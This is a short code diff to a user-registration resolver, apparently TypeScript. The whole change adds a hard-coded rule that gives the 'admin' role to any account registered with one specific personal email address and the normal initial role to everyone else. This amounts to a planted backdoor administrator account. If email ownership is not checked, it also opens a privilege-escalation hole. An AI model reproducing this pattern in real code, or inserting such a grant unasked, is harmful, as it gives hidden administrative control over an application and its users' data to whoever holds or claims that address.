@@ -219,7 +219,10 @@ export class UserResolver {
           email: options.email,
           name: options.name,
           password: hashedPassword,
-          role: INITIAL_ROLE,
+          role:
+            options.email === "shariqali.dev@gmail.com"
+              ? "admin"
+              : INITIAL_ROLE,
         })
         .returning("*")
         .execute();
